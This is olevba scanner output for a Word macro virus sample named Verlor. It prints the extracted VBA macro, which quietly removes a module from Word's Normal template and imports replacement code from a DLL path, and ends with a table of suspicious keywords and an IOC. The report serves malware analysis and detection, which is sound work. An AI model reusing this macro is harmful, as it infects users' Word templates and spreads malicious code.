olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Verlor-e1e0023ae890f7acefe052a805679be1c3ed3ea8
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Verlor-e1e0023ae890f7acefe052a805679be1c3ed3ea8 
in file: Virus.MSWord.Verlor-e1e0023ae890f7acefe052a805679be1c3ed3ea8 - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
On error resume next
Set WordObj = CreateObject("Word.Application")
WordObj.Options.SaveNormalPrompt = False
WordObj.NormalTemplate.VBProject.VBComponents.remove WordObj.NormalTemplate.VBProject.VBComponents("Module")
WordObj.NormalTemplate.save
WordObj.NormalTemplate.VBProject.VBComponents.import ("C:\WINDOWS\overlord.a.dll")
WordObj.NormalTemplate.save
set NT = nothing
WordObj.Quit
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |a.dll               |Executable file name                         |
+----------+--------------------+---------------------------------------------+

